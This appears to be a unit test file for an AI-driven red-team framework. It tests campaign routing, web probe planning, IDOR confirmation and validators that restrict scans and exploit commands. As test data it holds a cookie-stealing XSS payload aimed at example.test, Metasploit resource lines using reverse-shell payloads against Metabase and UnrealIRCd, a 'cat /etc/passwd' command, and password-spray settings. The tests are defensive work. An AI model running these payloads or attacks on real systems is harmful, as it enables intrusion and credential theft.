from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

import schemathesis
from pydantic import ValidationError

from medflow_api.schemas import (
    CampaignRequest,
    ToolQualityOutcomeRequest,
    ToolQualityStateRequest,
    ToolsmithCreateRequest,
)
from medflow_graph.memory import GraphStore
from medflow_redteam.campaign import (
    campaign_agent_selected,
    http_ports_from_scan,
    http_ports_from_services,
    observation_status,
    plan_campaign_routing,
)
from medflow_redteam.capabilities import capability_match_score, select_capabilities_for_services
from medflow_redteam.command_planner import (
    fallback_metasploit_resource,
    fallback_nmap_plan,
    fallback_proof_command,
    fallback_recon_strategy,
    fallback_validation_strategy,
    validate_recon_strategy,
    validate_metasploit_resource,
    validate_nmap_argv,
    validate_proof_command,
    validate_validation_strategy,
)
from medflow_redteam.generated_tools import (
    apply_quality_result_gate,
    load_generated_tool_specs,
    resolve_generated_tool_code,
    validate_generated_tool_code,
    validate_generated_tool_result,
)
from medflow_redteam.evidence import normalize_authorization_evidence
from medflow_redteam.identity import analyze_identity_logs
from medflow_redteam.metasploit_runner import first_interesting_line, has_command_output_proof, payload_attempts
from medflow_redteam.tools import normalize_validation_status, route_technology_signals, web_control_checks
from medflow_redteam.tool_quality import (
    artifact_hash,
    quality_for_spec,
    record_quality_outcome,
    set_quality_state,
)
from medflow_redteam.web_executor import validate_probe
from medflow_redteam.web_reasoner import plan_web_probes
from medflow_redteam.web_app import (
    WebAuthContext,
    WebParam,
    WebRoute,
    build_request,
    extract_client_routes,
    extract_robots_routes,
    redact_auth_context,
    response_signals,
    run_web_assessment,
    run_idor_confirmation,
    persist_web_observation_graph,
    run_safe_web_probes,
)
from medflow_redteam.web_kb import load_seed_documents
from medflow_redteam.web_stateful import (
    BudgetExhausted,
    Exchange,
    RequestBudget,
    build_operation_dependencies,
    confirms_cross_principal_access,
    confirms_ignored_auth,
    extract_operations,
    safe_url,
    schema_failure_types,
    schema_property_names,
    synthesize_object,
)
from medflow_ti.llm import make_llm


class RedTeamCoreTests(unittest.TestCase):
    def test_gpt_oss_is_supported_and_is_the_api_default(self) -> None:
        llm = make_llm(
            "gpt_oss",
            "test-key",
            "llama-3.1-8b-instant",
            "qwen/qwen3.6-27b",
            "openai/gpt-oss-120b",
        )
        self.assertEqual(llm.model, "openai/gpt-oss-120b")
        self.assertEqual(llm.reasoning_effort, "medium")
        self.assertTrue(llm.hide_reasoning)
        qwen = make_llm(
            "qwen",
            "test-key",
            "llama-3.1-8b-instant",
            "qwen/qwen3.6-27b",
            "openai/gpt-oss-120b",
        )
        self.assertEqual(qwen.reasoning_effort, "none")
        self.assertTrue(qwen.user_only)
        local_qwen = make_llm(
            "local_qwen",
            None,
            "llama-3.1-8b-instant",
            "qwen/qwen3.6-27b",
            "openai/gpt-oss-120b",
            local_qwen_base_url="http://127.0.0.1:8080/v1",
            local_qwen_model="qwen-local",
        )
        self.assertEqual(local_qwen.model, "qwen-local")
        self.assertEqual(local_qwen.base_url, "http://127.0.0.1:8080/v1")
        self.assertEqual(CampaignRequest(goal="authorized lab test").provider, "gpt_oss")
        self.assertEqual(
            CampaignRequest(
                goal="authorized local model test",
                provider="local_qwen",
            ).provider,
            "local_qwen",
        )
        self.assertFalse(CampaignRequest(goal="authorized lab test").stateful_api)
        self.assertEqual(ToolsmithCreateRequest(id="observer").provider, "gpt_oss")
        self.assertEqual(ToolQualityStateRequest(state="shadow", reason="fixture reviewed").state, "shadow")
        self.assertEqual(ToolQualityOutcomeRequest(outcome="tool_error").outcome, "tool_error")

    def test_campaign_accepts_one_explicit_url_scope(self) -> None:
        request = CampaignRequest(
            goal="Assess the authorized web application.",
            target_url="https://lab.example/app",
            use_llm=True,
        )
        self.assertEqual(request.target_url, "https://lab.example/app")
        with self.assertRaises(ValidationError):
            CampaignRequest(
                goal="Invalid mixed scope.",
                target="127.0.0.1",
                target_url="https://lab.example/",
            )

    def test_active_identity_agents_require_url_and_aggressive_spray_mode(self) -> None:
        with self.assertRaises(ValidationError):
            CampaignRequest(
                goal="Missing URL.",
                wordlist_attack={
                    "endpoint": "/login",
                    "username": "synthetic-user",
                },
            )
        with self.assertRaises(ValidationError):
            CampaignRequest(
                goal="Spray in safe mode.",
                target_url="http://127.0.0.1:3000/",
                password_spray={"endpoint": "/login"},
            )
        request = CampaignRequest(
            goal="Authorized identity lab.",
            target_url="http://127.0.0.1:3000/",
            execution_mode="aggressive_lab",
            wordlist_attack={
                "endpoint": "/login",
                "username": "synthetic-user",
                "max_passwords": 100,
            },
            password_spray={
                "endpoint": "/login",
                "max_users": 3,
                "max_passwords": 2,
            },
        )
        self.assertEqual(request.wordlist_attack.max_passwords, 100)
        self.assertEqual(request.password_spray.max_attempts, 30)

    def test_campaign_llm_routes_authorization_without_caller_agent_selection(self) -> None:
        response = json.dumps(
            {
                "selected_agents": [
                    "reconnaissance",
                    "web_api_attack",
                    "authorization_assessment",
                    "reporting",
                ],
                "run_authorization_assessment": True,
                "authorization_reason": "The broad web assessment includes access controls.",
            }
        )
        state = {
            "goal": "Run a broad authorized web/API security assessment.",
            "target": None,
            "target_url": "https://lab.example/",
            "provider": "qwen",
            "use_llm": True,
        }
        with patch(
            "medflow_redteam.campaign.call_redteam_llm",
            return_value=response,
        ):
            routing = plan_campaign_routing(state, SimpleNamespace())

        self.assertTrue(routing["run_authorization_assessment"])
        self.assertEqual(routing["generated_by"], "llm:qwen")
        self.assertIn("authorization_assessment", routing["selected_agents"])
        routed_state = {"campaign_routing": routing}
        self.assertTrue(campaign_agent_selected(routed_state, "web_api_attack"))
        self.assertFalse(campaign_agent_selected(routed_state, "identity_attack"))

    def test_campaign_without_llm_does_not_launch_llm_subworkflow(self) -> None:
        routing = plan_campaign_routing(
            {
                "goal": "Offline report.",
                "target_url": "https://lab.example/",
                "use_llm": False,
            },
            SimpleNamespace(),
        )
        self.assertFalse(routing["run_authorization_assessment"])
        self.assertEqual(routing["generated_by"], "deterministic_fallback")

        validation_routing = plan_campaign_routing(
            {
                "goal": "Offline network validation.",
                "target": "127.0.0.1",
                "execute_validation": True,
                "use_llm": False,
            },
            SimpleNamespace(),
        )
        self.assertIn(
            "capability_validation",
            validation_routing["selected_agents"],
        )
        identity_routing = plan_campaign_routing(
            {
                "goal": "Authorized identity validation.",
                "target_url": "http://127.0.0.1:3000/",
                "wordlist_attack_config": object(),
                "password_spray_config": object(),
                "use_llm": False,
            },
            SimpleNamespace(),
        )
        self.assertIn("wordlist_attack", identity_routing["selected_agents"])
        self.assertIn("password_spray", identity_routing["selected_agents"])

    def test_authorization_findings_join_normalized_campaign_evidence(self) -> None:
        evidence = normalize_authorization_evidence(
            {
                "findings": [
                    {
                        "title": "Object authorization failure",
                        "severity": "high",
                        "evidence_action_ids": ["object_read_other"],
                        "classification": [
                            {
                                "cwe": "CWE-639",
                                "owasp": "A01:2021",
                            }
                        ],
                        "remediation": ["Enforce ownership checks."],
                    }
                ]
            },
            target_url="https://lab.example/",
        )
        self.assertEqual(evidence[0]["status"], "confirmed_vulnerability")
        self.assertEqual(evidence[0]["asset"], "https://lab.example/")
        self.assertIn("CWE-639", evidence[0]["references"])

    def test_validation_statuses_are_explicit(self) -> None:
        self.assertEqual(
            normalize_validation_status({"allowed": False, "verified": False}),
            "blocked_by_safety_policy",
        )
        self.assertEqual(
            normalize_validation_status({"allowed": True, "verified": True}, {"runner": "generated_python_tool"}),
            "confirmed_exposure",
        )
        self.assertEqual(
            normalize_validation_status({"allowed": True, "verified": False, "reason": "no finding"}),
            "ran_no_finding",
        )

    def test_graph_review_confirm_tombstones_duplicate(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            store = GraphStore(Path(tmp) / "graph.json")
            first = store.upsert_node("Finding", "Packet Capture Exposure", context="download 0 pcap", stable_key="finding-a").node
            second = store.upsert_node("Finding", "Packet Capture Exposure", context="download 1 pcap", stable_key="finding-b").node
            store.add_review(second.id, first.id, 0.9, "test duplicate")
            review_id = store.pending_reviews()[0].id
            store.apply_review(review_id, "confirm")
            self.assertEqual(store.reviews[review_id].status, "confirmed")
            self.assertEqual(store.nodes[second.id].status, "tombstoned")

    def test_identity_log_mfa_fatigue_signal(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "events.json"
            events = [
                {"user": "alice@example.test", "event": "MFA push denied"}
                for _ in range(5)
            ]
            path.write_text(json.dumps(events), encoding="utf-8")
            result = analyze_identity_logs(path)
            self.assertEqual(result["findings"][0]["type"], "mfa_fatigue_signal")

    def test_web_evidence_boosts_only_web_matches(self) -> None:
        web_routes = {"web_routes": [{"url": "http://lab/download/1", "artifact_signal": "possible packet capture exposure"}]}
        http_capability = {
            "id": "http_header",
            "runner": "nmap_nse_script",
            "provider": "inventory",
            "match": {"service": "http", "ports": ["80"], "product_keywords": ["http"]},
        }
        ftp_capability = {
            "id": "ftp_check",
            "runner": "nmap_nse_script",
            "provider": "inventory",
            "match": {"service": "ftp", "ports": ["21"], "product_keywords": ["ftp"]},
        }
        http_score, http_reasons = capability_match_score(
            http_capability,
            {"service": "http", "port": "80", "version": "Gunicorn"},
            web_routes=web_routes,
        )
        ftp_score, ftp_reasons = capability_match_score(
            ftp_capability,
            {"service": "ftp", "port": "21", "version": "vsftpd"},
            web_routes=web_routes,
        )
        self.assertGreater(http_score, ftp_score)
        self.assertIn("web artifact signal observed", http_reasons)
        self.assertNotIn("web artifact signal observed", ftp_reasons)

    def test_web_control_checks_from_observations(self) -> None:
        result = web_control_checks(
            {"web_routes": [{"url": "http://lab/download/1", "content_type": "application/vnd.tcpdump.pcap", "artifact_signal": "possible packet capture exposure"}]},
            {"web_fingerprints": [{"url": "http://lab/", "security_headers": {"content_security_policy": False}}]},
        )
        self.assertGreaterEqual(result["count"], 2)

    def test_spa_routes_do_not_create_framework_false_positives(self) -> None:
        signals = route_technology_signals(
            "http://lab:3000/functionRouter",
            "Metabase",
            "<html><title>Metabase</title><script src='/app.js'></script></html>",
            200,
        )
        self.assertIn("metabase", signals)
        self.assertNotIn("spring", signals)
        self.assertNotIn("struts", signals)

    def test_web_app_graph_and_llm_evidence(self) -> None:
        route = WebRoute(
            url="http://172.29.10.10:8080/item?id=1&q=test",
            status=200,
            title="Search",
            params=[
                WebParam("id", "query", "1"),
                WebParam("q", "query", "test"),
            ],
        )
        analyst_finding = {
            "type": "sqli_differential_signal",
            "severity": "medium",
            "confidence": "medium",
            "url": route.url,
            "parameter": "id",
            "evidence": "Planner probe produced a database error response.",
            "proof": "Redacted response evidence.",
            "cwe": "CWE-89",
            "owasp": "A03:2021-Injection",
            "status": "suspected",
        }
        with patch("medflow_redteam.web_app.assess_web_observations", return_value=[analyst_finding]):
            findings = run_safe_web_probes([route], use_llm=True, probe_results=[{"kind": "sqli", "status": "completed"}])
        self.assertEqual(findings[0].type, "sqli_differential_signal")

        with tempfile.TemporaryDirectory() as tmp:
            graph = persist_web_observation_graph("172.29.10.10", [8080], [route], findings, Path(tmp) / "web_graph.json")
            summary = graph.summary()
            self.assertGreaterEqual(summary.get("nodes_route", 0), 1)
            self.assertGreaterEqual(summary.get("nodes_parameter", 0), 2)
            self.assertGreaterEqual(summary.get("nodes_finding", 0), 1)

    def test_bounded_executor_rejects_unsafe_xss_payload(self) -> None:
        known = {"http://lab/search?q="}
        allowed = validate_probe(
            {
                "kind": "xss_dom",
                "url": "http://lab/search?q=",
                "method": "GET",
                "parameter": "q",
                "payload": "<img src=x onerror=\"document.title='MEDFLOW_DOM_XSS'\">",
            },
            known,
        )
        blocked = validate_probe(
            {
                "kind": "xss_dom",
                "url": "http://lab/search?q=",
                "method": "GET",
                "parameter": "q",
                "payload": "<script>fetch('https://example.test/?x='+document.cookie);document.title='MEDFLOW_DOM_XSS'</script>",
            },
            known,
        )
        self.assertIsNotNone(allowed)
        self.assertIsNone(blocked)

    def test_llm_web_planner_only_accepts_observed_routes(self) -> None:
        context = {
            "routes": [{"url": "http://lab/search?q=", "query_parameters": ["q"]}],
            "browser": {"available": True, "pages": [], "requests": []},
        }
        raw = json.dumps(
            {
                "probes": [
                    {"kind": "sqli", "url": "http://lab/search?q=", "method": "GET", "parameter": "q", "payload": "'"},
                    {"kind": "sqli", "url": "http://outside.test/", "method": "GET", "parameter": "q", "payload": "'"},
                ]
            }
        )
        with patch("medflow_redteam.web_reasoner.call_redteam_llm", return_value=raw):
            probes = plan_web_probes(context, "llama")
        self.assertEqual(len(probes), 1)
        self.assertEqual(probes[0]["url"], "http://lab/search?q=")

    def test_web_assessment_connects_collector_planner_executor_and_analyst(self) -> None:
        route = WebRoute(url="http://lab/search?q=", status=200, content_type="application/json", params=[WebParam("q", "query")])
        plan = [{"kind": "sqli", "url": route.url, "method": "GET", "parameter": "q", "payload": "'", "body": {}}]
        results = [{"kind": "sqli", "url": route.url, "status": "completed", "baseline": {"status": 200}, "probe": {"status": 500}}]
        analyst = [{"type": "sqli_signal", "severity": "medium", "confidence": "medium", "url": route.url, "evidence": "Observed differential.", "proof": "HTTP response changed.", "status": "suspected"}]
        with (
            patch("medflow_redteam.web_app.crawl_web", return_value=[route]),
            patch("medflow_redteam.web_app.collect_browser_observations", return_value={"available": True, "pages": [], "requests": []}),
            patch("medflow_redteam.web_app.plan_web_probes", return_value=plan),
            patch("medflow_redteam.web_app.execute_planned_probes", return_value=results),
            patch("medflow_redteam.web_app.assess_web_observations", return_value=analyst),
        ):
            assessment = run_web_assessment("127.0.0.1", [8080], use_kb=False, use_llm=True)
        self.assertTrue(assessment["browser_observations"]["available"])
        self.assertEqual(assessment["planned_probes"], plan)
        self.assertEqual(assessment["probe_results"], results)
        self.assertEqual(assessment["findings"][0]["type"], "sqli_signal")

    def test_web_appsec_seed_documents_load(self) -> None:
        docs = load_seed_documents()
        collections = {doc.collection for doc in docs}
        self.assertIn("web_methodology_db", collections)
        self.assertIn("web_payload_db", collections)
        self.assertTrue(any("SQL injection" in doc.text for doc in docs))

    def test_spa_and_robots_route_discovery(self) -> None:
        routes = extract_client_routes(
            "const a=`${host}/rest/products/search?q=${e}`; const b=\"/api/Products\"; const ignored='/assets/app.js';"
        )
        self.assertIn("/rest/products/search?q=", routes)
        self.assertIn("/api/Products", routes)
        self.assertNotIn("/assets/app.js", routes)
        self.assertEqual(extract_robots_routes("User-agent: *\nDisallow: /ftp\nAllow: /public\n"), ["/ftp", "/public"])

    def test_json_response_facts_are_value_free(self) -> None:
        signals = response_signals('{"data": [{"email": "redacted@example.test", "password": "not-retained", "totpSecret": "not-retained"}]}', "application/json")
        self.assertEqual(signals, ["data", "email", "password", "totpsecret"])

    def test_idor_confirmation_requires_declared_owner_and_redacts_secrets(self) -> None:
        route = WebRoute(
            url="http://172.29.10.10:8080/api/records/101",
            status=200,
            params=[WebParam("path_segment", "path", "101", ["object_id"])],
        )
        owner = WebAuthContext(
            name="alice",
            headers={"Authorization": "Bearer alice-secret"},
            cookies={"session": "alice-cookie"},
            owned_object_ids=["101"],
        )
        alternate = WebAuthContext(name="bob", headers={"Authorization": "Bearer bob-secret"})

        def fake_fetch(url: str, auth_context: WebAuthContext | None = None) -> dict:
            if auth_context and auth_context.name in {"alice", "bob"}:
                return {"ok": True, "status": 200, "body": "record 101 owner alice diagnosis demo"}
            return {"ok": False}

        with patch("medflow_redteam.web_app.fetch_text", side_effect=fake_fetch):
            findings = run_idor_confirmation([route], owner, alternate)
        self.assertEqual(findings[0].type, "idor_confirmed")
        self.assertEqual(findings[0].status, "confirmed_vulnerability")

        redacted = redact_auth_context(owner)
        self.assertEqual(redacted["header_names"], ["Authorization"])
        self.assertEqual(redacted["cookie_names"], ["session"])
        self.assertNotIn("alice-secret", json.dumps(redacted))
        self.assertEqual(build_request("http://lab/", owner).get_header("Cookie"), "session=alice-cookie")

        no_owner = WebAuthContext(name="alice", headers=owner.headers)
        with patch("medflow_redteam.web_app.fetch_text", side_effect=fake_fetch):
            self.assertEqual(run_idor_confirmation([route], no_owner, alternate), [])

    def test_stateful_api_builds_resource_dependencies_from_openapi(self) -> None:
        raw_schema = {
            "openapi": "3.0.0",
            "info": {"title": "Demo", "version": "1"},
            "paths": {
                "/records": {
                    "post": {
                        "requestBody": {
                            "content": {
                                "application/json": {
                                    "schema": {
                                        "type": "object",
                                        "properties": {"record_id": {"type": "string"}},
                                    }
                                }
                            }
                        },
                        "responses": {"201": {"description": "created"}},
                    }
                },
                "/records/{record_id}": {
                    "get": {
                        "security": [{"bearerAuth": []}],
                        "description": "Only the owner may retrieve this private record.",
                        "parameters": [
                            {
                                "name": "record_id",
                                "in": "path",
                                "required": True,
                                "schema": {"type": "string"},
                            }
                        ],
                        "responses": {
                            "200": {
                                "description": "record",
                                "content": {
                                    "application/json": {
                                        "schema": {
                                            "type": "object",
                                            "properties": {"record_id": {"type": "string"}, "secret": {"type": "string"}},
                                        }
                                    }
                                },
                            }
                        },
                    }
                },
            },
        }
        operations = extract_operations(raw_schema, schemathesis.openapi.from_dict(raw_schema))
        dependencies = build_operation_dependencies(operations)
        self.assertEqual(dependencies[0]["producer"], "POST /records")
        self.assertEqual(dependencies[0]["consumer"], "GET /records/{record_id}")
        read = next(item for item in operations if item.method == "GET")
        self.assertTrue(read.owner_scoped)
        self.assertTrue(read.protected)

    def test_stateful_differential_requires_material_access_and_rejects_auth_denials(self) -> None:
        raw_schema = {
            "openapi": "3.0.0",
            "info": {"title": "Demo", "version": "1"},
            "paths": {
                "/records/{record_id}": {
                    "get": {
                        "security": [{"bearerAuth": []}],
                        "description": "Only the owner may retrieve the secret.",
                        "parameters": [
                            {
                                "name": "record_id",
                                "in": "path",
                                "required": True,
                                "schema": {"type": "string"},
                            }
                        ],
                        "responses": {"200": {"description": "record"}},
                    }
                }
            },
        }
        operation = extract_operations(raw_schema, schemathesis.openapi.from_dict(raw_schema))[0]
        owner = Exchange(
            operation=operation,
            principal="owner",
            status=200,
            url="http://lab/records/1",
            elapsed_ms=1,
            response_text='{"record_id":"1","secret":"proof"}',
            response_json={"record_id": "1", "secret": "proof"},
            response_fields=["recordid", "secret"],
        )
        alternate = Exchange(
            operation=operation,
            principal="alternate",
            status=200,
            url="http://lab/records/1",
            elapsed_ms=1,
            response_text='{"record_id":"1","secret":"proof"}',
            response_json={"record_id": "1", "secret": "proof"},
            response_fields=["recordid", "secret"],
        )
        denied = Exchange(
            operation=operation,
            principal="anonymous",
            status=200,
            url="http://lab/records/1",
            elapsed_ms=1,
            response_text='{"message":"Missing authorization"}',
            response_json={"message": "Missing authorization"},
            response_fields=["message"],
        )
        self.assertTrue(confirms_cross_principal_access(operation, owner, alternate))
        self.assertTrue(confirms_ignored_auth(owner, alternate))
        self.assertFalse(denied.successful)
        self.assertFalse(confirms_ignored_auth(owner, denied))

    def test_stateful_api_synthesizes_fresh_identity_data_and_redacts_query_values(self) -> None:
        body = synthesize_object(
            {
                "type": "object",
                "properties": {
                    "username": {"type": "string", "example": "demo"},
                    "password": {"type": "string", "example": "pass"},
                    "email": {"type": "string", "format": "email"},
                    "is_admin": {"type": "boolean"},
                    "role": {"type": "string", "enum": ["admin", "user"]},
                },
            },
            role="owner",
            purpose="identity",
        )
        self.assertTrue(str(body["username"]).startswith("owner_"))
        self.assertNotEqual(body["password"], "pass")
        self.assertTrue(str(body["email"]).endswith("@example.test"))
        self.assertFalse(body["is_admin"])
        self.assertEqual(body["role"], "user")
        self.assertEqual(
            safe_url("http://lab/api?token=secret&id=101"),
            "http://lab/api?token=<redacted>&id=<redacted>",
        )
        self.assertEqual(
            schema_property_names(
                {
                    "type": "object",
                    "properties": {
                        "record": {
                            "type": "object",
                            "properties": {"secret": {"type": "string"}},
                        }
                    },
                }
            ),
            {"record", "secret"},
        )
        failures = schema_failure_types(ExceptionGroup("response body: sensitive", [ValueError("token=secret")]))
        self.assertEqual(failures, ["ValueError"])
        budget = RequestBudget(1)
        budget.consume()
        self.assertEqual(budget.remaining, 0)
        with self.assertRaises(BudgetExhausted):
            budget.consume()

    def test_generated_tool_specs_from_dynamic_cache_are_valid(self) -> None:
        specs = load_generated_tool_specs()
        for item in specs:
            validation = validate_generated_tool_code(resolve_generated_tool_code(item))
            self.assertTrue(validation.ok, validation.errors)
        if specs:
            spec = specs[0]
            match = spec.get("match") or {}
            ports = match.get("ports") or ["1"]
            selected = select_capabilities_for_services(
                "172.29.10.10",
                [
                    {
                        "port": str(ports[0]),
                        "service": str(match.get("service") or "unknown"),
                        "version": " ".join(match.get("product_keywords") or []),
                    }
                ],
                limit=1,
            )
            self.assertEqual(selected["selected_candidates"][0]["runner"], "generated_python_tool")

    def test_generated_tool_quality_lifecycle_and_circuit_breaker(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            registry = root / "quality.json"
            code_path = root / "observer.py"
            code = "def run(context: dict) -> dict:\n    return {'verified': True}\n"
            code_path.write_text(code, encoding="utf-8")
            spec = {"id": "generated:observer", "runner": "generated_python_tool", "match": {"service": "http"}}

            candidate = quality_for_spec(spec, code_path, registry_path=registry)
            self.assertEqual(candidate["state"], "candidate")
            fixture = record_quality_outcome(candidate["artifact_hash"], "fixture_passed", registry_path=registry)
            self.assertEqual(fixture["state"], "fixture_passed")
            shadow = set_quality_state(
                candidate["artifact_hash"],
                "shadow",
                reason="Fixture behavior reviewed.",
                registry_path=registry,
            )
            self.assertEqual(shadow["state"], "shadow")
            with self.assertRaises(ValueError):
                set_quality_state(
                    candidate["artifact_hash"],
                    "trusted",
                    reason="Trust must be evidence-driven.",
                    registry_path=registry,
                )
            for _ in range(3):
                trusted = record_quality_outcome(
                    candidate["artifact_hash"],
                    "confirmed",
                    reason="Independent benchmark agreed.",
                    evidence_id=f"benchmark-{_}",
                    registry_path=registry,
                )
            self.assertEqual(trusted["state"], "trusted")
            degraded = record_quality_outcome(
                candidate["artifact_hash"],
                "contradicted",
                reason="Independent validator disagreed.",
                evidence_id="contradiction-1",
                registry_path=registry,
            )
            self.assertEqual(degraded["state"], "degraded")
            quarantined = record_quality_outcome(
                candidate["artifact_hash"],
                "contradicted",
                reason="Second independent contradiction.",
                evidence_id="contradiction-2",
                registry_path=registry,
            )
            self.assertEqual(quarantined["state"], "quarantined")

            changed = code + "\n# new version\n"
            self.assertNotEqual(artifact_hash(code, spec), artifact_hash(changed, spec))
            decorated = {
                **spec,
                "quality_state": "trusted",
                "quality_score": 0.95,
                "quality_stats": {"executions": 4},
                "score": 100,
                "reasons": ["runtime ranking"],
                "score_explanation": "runtime ranking",
                "matched_service": {"port": "80", "service": "http"},
            }
            self.assertEqual(artifact_hash(code, spec), artifact_hash(code, decorated))

    def test_candidate_contradiction_quarantines_without_becoming_executable(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            registry = root / "quality.json"
            code_path = root / "observer.py"
            code_path.write_text("def run(context: dict) -> dict:\n    return {}\n", encoding="utf-8")
            candidate = quality_for_spec({"id": "generated:new"}, code_path, registry_path=registry)
            result = record_quality_outcome(
                candidate["artifact_hash"],
                "contradicted",
                reason="Known-negative fixture produced a finding.",
                evidence_id="fixture-known-negative",
                registry_path=registry,
            )
            self.assertEqual(result["state"], "quarantined")

    def test_independent_quality_evidence_cannot_be_counted_twice(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            registry = root / "quality.json"
            code_path = root / "observer.py"
            code_path.write_text("def run(context: dict) -> dict:\n    return {}\n", encoding="utf-8")
            candidate = quality_for_spec({"id": "generated:new"}, code_path, registry_path=registry)
            record_quality_outcome(
                candidate["artifact_hash"],
                "fixture_passed",
                reason="Fixture passed.",
                registry_path=registry,
            )
            set_quality_state(
                candidate["artifact_hash"],
                "shadow",
                reason="Begin shadow evaluation.",
                registry_path=registry,
            )
            record_quality_outcome(
                candidate["artifact_hash"],
                "confirmed",
                evidence_id="benchmark-run-1",
                registry_path=registry,
            )
            with self.assertRaises(ValueError):
                record_quality_outcome(
                    candidate["artifact_hash"],
                    "confirmed",
                    evidence_id="benchmark-run-1",
                    registry_path=registry,
                )

    def test_shadow_tool_cannot_create_a_finding(self) -> None:
        result = apply_quality_result_gate({"verified": True, "exploited": True, "proof_output": "self report"}, "shadow")
        self.assertFalse(result["verified"])
        self.assertFalse(result["exploited"])
        self.assertTrue(result["reported_verified"])
        self.assertTrue(result["quality_shadow"])

    def test_generated_tool_result_contract_rejects_false_positive_shapes(self) -> None:
        self.assertFalse(validate_generated_tool_result({"verified": "false"}).ok)
        self.assertFalse(validate_generated_tool_result({"verified": True, "exploited": False}).ok)
        self.assertFalse(
            validate_generated_tool_result(
                {"verified": False, "exploited": True, "proof_output": "unexpected"}
            ).ok
        )
        self.assertTrue(
            validate_generated_tool_result(
                {"allowed": True, "verified": True, "exploited": False, "proof_output": "HTTP 200"}
            ).ok
        )

    def test_observation_status_does_not_call_errors_success(self) -> None:
        self.assertEqual(
            observation_status({"http_probe": [{"url": "http://lab/", "error": "connection refused"}]}, "http_probe"),
            "ran_no_finding",
        )
        self.assertEqual(
            observation_status({"http_probe": [{"url": "http://lab/", "status": 200}, {"url": "http://lab/admin", "error": "404"}]}, "http_probe"),
            "partial_success",
        )

    def test_http_ports_only_from_http_like_services(self) -> None:
        self.assertEqual(
            http_ports_from_services(
                [
                    {"port": "21", "service": "ftp", "version": "ProFTPD"},
                    {"port": "6667", "service": "irc", "version": "UnrealIRCd"},
                ]
            ),
            [],
        )
        self.assertEqual(http_ports_from_services([{"port": "8180", "service": "http", "version": "Jetty"}]), [8180])
        self.assertEqual(http_ports_from_scan("3000/tcp open ppp?\nHTTP/1.1 200 OK\nContent-Type: text/html", [3000]), [3000])
        self.assertEqual(http_ports_from_scan("3000/tcp open ppp?", [3000]), [])

    def test_dynamic_command_plans_are_constrained(self) -> None:
        nmap_plan = fallback_nmap_plan("172.29.10.10", [21, 22])
        self.assertEqual(validate_nmap_argv(nmap_plan["argv"], "172.29.10.10", [21, 22]), nmap_plan["argv"])
        with self.assertRaises(ValueError):
            validate_nmap_argv(["nmap", "--script", "vuln", "-p", "21,22", "172.29.10.10"], "172.29.10.10", [21, 22])

        msf_plan = fallback_metasploit_resource(
            "172.29.10.10",
            "exploit/unix/irc/unreal_ircd_3281_backdoor",
            {"RPORT": "6667"},
            "cmd/unix/generic",
            "exploit",
        )
        self.assertEqual(
            validate_metasploit_resource(
                msf_plan["resource_lines"],
                "172.29.10.10",
                "exploit/unix/irc/unreal_ircd_3281_backdoor",
                "exploit",
            ),
            msf_plan["resource_lines"],
        )
        self.assertEqual(
            validate_metasploit_resource(
                [
                    "use exploit/linux/http/metabase_setup_token_rce",
                    "set RHOSTS 172.29.10.10",
                    "set RPORT 3000",
                    "set SSL false",
                    "set TARGETURI /",
                    "set VHOST lab.local",
                    "set PAYLOAD cmd/unix/reverse_bash",
                    "run -j",
                    "sleep 12",
                    "sessions -l",
                    "sessions -K",
                    "exit -y",
                ],
                "172.29.10.10",
                "exploit/linux/http/metabase_setup_token_rce",
                "exploit",
            ),
            [
                "use exploit/linux/http/metabase_setup_token_rce",
                "set RHOSTS 172.29.10.10",
                "set RPORT 3000",
                "set SSL false",
                "set TARGETURI /",
                "set VHOST lab.local",
                "set PAYLOAD cmd/unix/reverse_bash",
                "run -j",
                "sleep 12",
                "sessions -l",
                "sessions -K",
                "exit -y",
            ],
        )
        with self.assertRaises(ValueError):
            validate_metasploit_resource(
                ["use exploit/unix/irc/unreal_ircd_3281_backdoor", "set RHOSTS 8.8.8.8", "check", "exit -y"],
                "172.29.10.10",
                "exploit/unix/irc/unreal_ircd_3281_backdoor",
                "check",
            )
        with self.assertRaises(ValueError):
            validate_metasploit_resource(
                [
                    "use exploit/linux/http/metabase_setup_token_rce",
                    "set RHOSTS 172.29.10.10",
                    "set CMD cat /etc/passwd",
                    "run -j",
                    "sessions -l",
                    "sessions -K",
                    "exit -y",
                ],
                "172.29.10.10",
                "exploit/linux/http/metabase_setup_token_rce",
                "exploit",
            )

    def test_rce_proof_commands_are_constrained_and_prioritized(self) -> None:
        self.assertEqual(fallback_proof_command()["command"], "id")
        self.assertEqual(validate_proof_command(" uname   -a "), "uname -a")
        with self.assertRaises(ValueError):
            validate_proof_command("cat /etc/passwd")

        payloads = payload_attempts(
            {
                "selected_payload": "cmd/unix/reverse_bash",
                "payload_candidates": [
                    {"payload": "cmd/unix/reverse_bash"},
                    {"payload": "cmd/unix/generic"},
                ],
            }
        )
        self.assertEqual(payloads[0], "cmd/unix/generic")

        output = "random\nuid=1000(app) gid=1000(app) groups=1000(app)\n"
        self.assertTrue(has_command_output_proof(output, "id"))
        self.assertEqual(first_interesting_line(output, "id"), "uid=1000(app) gid=1000(app) groups=1000(app)")

    def test_llm_strategy_outputs_are_constrained(self) -> None:
        recon = validate_recon_strategy(
            {"service_scan_ports": [22, 80, 9999, "bad"], "http_probe_ports": [80, 9999], "validation_focus": ["web first"]},
            [22, 80],
            fallback_recon_strategy([22, 80]),
        )
        self.assertEqual(recon["service_scan_ports"], [22, 80])
        self.assertEqual(recon["http_probe_ports"], [80])

        candidates = [{"id": "a"}, {"id": "b"}]
        strategy = validate_validation_strategy(
            {"selected_ids": ["b", "unknown", "a"]},
            candidates,
            2,
            fallback_validation_strategy(candidates, 2),
        )
        self.assertEqual(strategy["selected_ids"], ["b", "a"])


if __name__ == "__main__":
    unittest.main()
